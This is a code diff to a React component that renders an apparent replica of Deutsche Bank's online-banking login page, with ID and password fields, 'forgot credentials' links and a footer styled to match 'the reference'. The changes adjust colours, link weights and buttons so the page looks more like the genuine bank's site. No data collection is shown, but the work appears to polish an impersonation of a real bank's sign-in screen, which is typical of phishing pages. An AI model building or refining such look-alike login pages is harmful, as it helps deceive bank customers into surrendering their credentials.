@@ -10,7 +10,8 @@ import teaserAsset from "@/assets/deutsche-bank-teaser.jpg.asset.json";
 
 const BLUE = "#0018a8";
 const RED = "#c1002b";
-const LIGHT = "#e5f0fa";
+const LIGHT = "#ceeaf8";
+const LINK = "#0550d1";
 
 const DeutscheBank = () => {
   const [searchParams] = useSearchParams();
@@ -90,12 +91,12 @@ const DeutscheBank = () => {
               {/* Info box */}
               <div
                 className="flex gap-3 p-5 rounded-sm text-[14px] leading-snug"
-                style={{ backgroundColor: LIGHT, color: "#003366" }}
+                style={{ backgroundColor: LIGHT, color: "#171945" }}
               >
                 <div className="pt-0.5">
                   <div
                     className="w-5 h-5 rounded-full flex items-center justify-center"
-                    style={{ backgroundColor: "#1a3a4a" }}
+                    style={{ backgroundColor: "#206683" }}
                   >
                     <Info size={14} color="#fff" />
                   </div>
@@ -159,7 +160,7 @@ const DeutscheBank = () => {
                     />
 
                     <div className="flex items-center justify-between mt-10">
-                      <a href="#" className="text-[14px] underline" style={{ color: BLUE }}>
+                      <a href="#" className="text-[14px] underline font-bold" style={{ color: LINK }}>
                         Zugangsdaten vergessen?
                       </a>
                       <button
@@ -168,7 +169,7 @@ const DeutscheBank = () => {
                         disabled={dbId.trim().length === 0}
                         className="px-8 py-2.5 text-white font-semibold text-[15px]"
                         style={{
-                          backgroundColor: dbId.trim().length === 0 ? "#c6c6c6" : BLUE,
+                          backgroundColor: dbId.trim().length === 0 ? "#c6c6c6" : LINK,
                           cursor: dbId.trim().length === 0 ? "not-allowed" : "pointer",
                         }}
                       >
@@ -203,7 +204,7 @@ const DeutscheBank = () => {
                     </div>
 
                     <div className="flex items-center justify-between mt-10">
-                      <a href="#" className="text-[14px] underline" style={{ color: BLUE }}>
+                      <a href="#" className="text-[14px] underline font-bold" style={{ color: LINK }}>
                         Zugangsdaten vergessen?
                       </a>
                       <button
@@ -212,7 +213,7 @@ const DeutscheBank = () => {
                         disabled={password.length === 0}
                         className="px-8 py-2.5 text-white font-semibold text-[15px]"
                         style={{
-                          backgroundColor: password.length === 0 ? "#c6c6c6" : BLUE,
+                          backgroundColor: password.length === 0 ? "#c6c6c6" : LINK,
                           cursor: password.length === 0 ? "not-allowed" : "pointer",
                         }}
                       >
@@ -240,7 +241,7 @@ const DeutscheBank = () => {
                   <div className="text-[14px] mt-2" style={{ color: "#333" }}>
                     Deutsche Bank FestzinsSparen
                   </div>
-                  <div className="mt-3 text-[14px] underline" style={{ color: BLUE }}>
+                  <div className="mt-3 text-[14px] underline font-bold" style={{ color: LINK }}>
                     Mehr erfahren
                   </div>
                 </div>
@@ -273,7 +274,7 @@ const DeutscheBank = () => {
               />
 
               {/* Footer - dark navy background matching the reference */}
-              <div className="px-5 py-5 text-[13px]" style={{ backgroundColor: "#0a1a4a", color: "#fff" }}>
+              <div className="px-5 py-5 text-[13px]" style={{ backgroundColor: "#1e2a78", color: "#fff" }}>
                 <div className="flex flex-wrap gap-x-5 gap-y-1 mb-2 font-semibold">
                   <a href="#" className="hover:underline">English Version</a>
                   <a href="#" className="hover:underline">Hilfe</a>
@@ -289,8 +290,8 @@ const DeutscheBank = () => {
                 </div>
                 <button
                   type="button"
-                  className="text-[13px] font-semibold px-4 py-2 mb-3"
-                  style={{ backgroundColor: "#fff", color: BLUE }}
+                  className="text-[13px] font-semibold px-4 py-2 mb-3 text-white"
+                  style={{ backgroundColor: "#0550d1" }}
                 >
                   Vertrag widerrufen
                 </button>
@@ -325,7 +326,7 @@ const InfoBlock = ({
     </p>
     <div className="space-y-1">
       {links.map((l) => (
-        <a key={l} href="#" className="block text-[14px] underline" style={{ color: BLUE }}>
+        <a key={l} href="#" className="block text-[14px] underline font-bold" style={{ color: LINK }}>
           {l}
         </a>
       ))}
